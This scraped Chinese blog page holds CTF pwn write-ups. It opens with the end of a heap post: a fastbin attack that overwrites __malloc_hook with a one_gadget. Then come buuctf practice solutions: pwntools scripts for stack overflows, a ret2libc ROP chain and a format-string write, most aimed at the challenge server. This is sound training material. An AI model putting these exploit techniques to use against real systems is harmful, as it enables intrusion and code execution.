<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>下面是fastbin_index的宏定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过地址错位达到目的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">address</th>
<th style="text-align:center">+0</th>
<th style="text-align:center">+1</th>
<th style="text-align:center">+2</th>
<th style="text-align:center">+3</th>
<th style="text-align:center">+4</th>
<th style="text-align:center">+5</th>
<th style="text-align:center">+6</th>
<th style="text-align:center">+7</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x7fc36e4ddaf0</td>
<td style="text-align:center">60</td>
<td style="text-align:center">c2</td>
<td style="text-align:center">4d</td>
<td style="text-align:center">6e</td>
<td style="text-align:center">c3</td>
<td style="text-align:center"><font color=red>7f</font></td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center"><font color=red>00</font></td>
</tr>
<tr>
<td style="text-align:center">0x7fc36e4ddaf8</td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center"><font color=red>00</font></td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
</tr>
<tr>
<td style="text-align:center">0x7fc36e4ddb00</td>
<td style="text-align:center">a0</td>
<td style="text-align:center">ee</td>
<td style="text-align:center">19</td>
<td style="text-align:center">6e</td>
<td style="text-align:center">c3</td>
<td style="text-align:center">7f</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
</tr>
</tbody>
</table>
<p>红色部分刚好能通过这个检查，需要使fd变为__malloc_hook-0x23才行，其对应的fastbin应该是存放0x70大小chunk的fastbin，因此我们要事先分配好0x70大小的chunk然后释放它，修改fd指针后再申请回来即可。<br />
拿到__malloc_hook处的chunk后向__malloc_hook写入one_gadget即可，尝试了4个只有一个能成功，而且最后一次分配chunk还必须在interactive之后手动分配，自动分配打远程会卡住…</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 29330)</span></span><br><span class="line"></span><br><span class="line">in_use = [<span class="literal">False</span>] * <span class="number">0x10</span>		<span class="comment"># in_use array</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Allocate Index &#x27;</span>)</span><br><span class="line">	allocated_index = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">10</span>)</span><br><span class="line">	in_use[allocated_index] = <span class="literal">True</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	in_use[index] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #0</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #1</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #2</span></span><br><span class="line">allocate(<span class="number">0x110</span>)		<span class="comment"># chunk #3</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x110</span>)</span><br><span class="line">payload += p64(<span class="number">0x120</span>)		<span class="comment"># prev_size of chunk #1</span></span><br><span class="line">payload += p64(<span class="number">0x241</span>)		<span class="comment"># fake size of chunk #1</span></span><br><span class="line">fill(<span class="number">0</span>, <span class="number">0x120</span>, payload)</span><br><span class="line"></span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x130</span>)		<span class="comment"># fake chunk #1</span></span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">malloc_hook = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x100</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0xf0</span>)		<span class="comment"># chunk #4</span></span><br><span class="line">allocate(<span class="number">0x20</span>)		<span class="comment"># chunk #5</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #6</span></span><br><span class="line"></span><br><span class="line">release(<span class="number">6</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))	<span class="comment"># fastbin attack</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #6</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #7, this one is on __malloc_hook</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">7</span>, <span class="number">0x1B</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(one_gadgets[<span class="number">1</span>] + base))	<span class="comment"># write one_gadget</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># release(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate(0x20)	### DO THIS IN INTERACTIVE()!!!</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-1/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:04:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:04:00+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:56" itemprop="dateModified" datetime="2023-03-01T11:30:56+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>8.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF网站</a></p>
<p>笔者认为过于简单的题目会直接附上exp。<br />
<s>（不得不说buu的题目还挺多的）</s><br />
零基础pwn萌新推荐先看这个：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro">视频</a></p>
<h1 id="buu001-test_your_nc"><a class="markdownIt-Anchor" href="#buu001-test_your_nc"></a> buu001-test_your_nc</h1>
<p>连上就行</p>
<h1 id="buu002-rip"><a class="markdownIt-Anchor" href="#buu002-rip"></a> buu002-rip</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27534</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(cyclic(<span class="number">15</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu003-warmup_csaw_2016"><a class="markdownIt-Anchor" href="#buu003-warmup_csaw_2016"></a> buu003-warmup_csaw_2016</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25377</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, cyclic(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x40060D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu004-ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#buu004-ciscn_2019_n_1"></a> buu004-ciscn_2019_n_1</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26735</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Let\&#x27;s guess the number&#x27;</span>, cyclic(<span class="number">44</span>) + p32(<span class="number">0x41348000</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu005-pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#buu005-pwn1_sctf_2016"></a> buu005-pwn1_sctf_2016</h1>
<p>这道题是一个C++ pwn，但是逻辑不难理解，简单分析一下。下面是IDA反汇编的漏洞函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重点关注&quot;=&quot;和replace函数，这也是程序在栈内存中操作的重点。在调试过程中，那些<code>std::allocator&lt;char&gt;::allocator</code>的语句对栈区没有明显的影响，略过。经过手动反编译，还原出的源代码大致如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> info[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">	<span class="built_in">fgets</span>(info, <span class="number">32</span>, stdin);</span><br><span class="line">	input = info;</span><br><span class="line">	string you = <span class="string">&quot;you&quot;</span>;</span><br><span class="line">	string I = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">	rep = <span class="built_in">replace</span>(input, you, I);	<span class="comment">// replace &quot;I&quot; with &quot;you&quot;</span></span><br><span class="line">	<span class="built_in">strcpy</span>(info, rep.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">vuln</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的功能是将info中所有的&quot;I&quot;换成&quot;you&quot;，replace函数甚至都无需分析。由此很容易看出这里有潜在的溢出问题。而且程序本身也给了后门，因此直接修改返回地址即可。<br />
exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu006-jarvisoj_level0"><a class="markdownIt-Anchor" href="#buu006-jarvisoj_level0"></a> buu006-jarvisoj_level0</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26344</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World&#x27;</span>, cyclic(<span class="number">128</span>+<span class="number">8</span>) + p64(<span class="number">0x400596</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu007-ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#buu007-ciscn_2019_c_1"></a> buu007-ciscn_2019_c_1</h1>
<p>常规的获取got表地址，LibcSearcher有的时候可以有的时候不行，题目能给libc是最好的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25958</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)	<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu008-第五空间2019-决赛pwn5"><a class="markdownIt-Anchor" href="#buu008-第五空间2019-决赛pwn5"></a> buu008-[第五空间2019 决赛]PWN5</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28577</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
